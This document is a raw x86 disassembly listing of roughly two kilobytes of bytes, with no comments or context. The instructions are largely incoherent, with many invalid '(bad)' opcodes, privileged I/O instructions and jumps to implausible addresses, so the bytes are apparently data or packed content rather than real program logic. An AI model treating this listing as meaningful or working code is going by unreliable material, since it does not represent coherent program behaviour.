  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
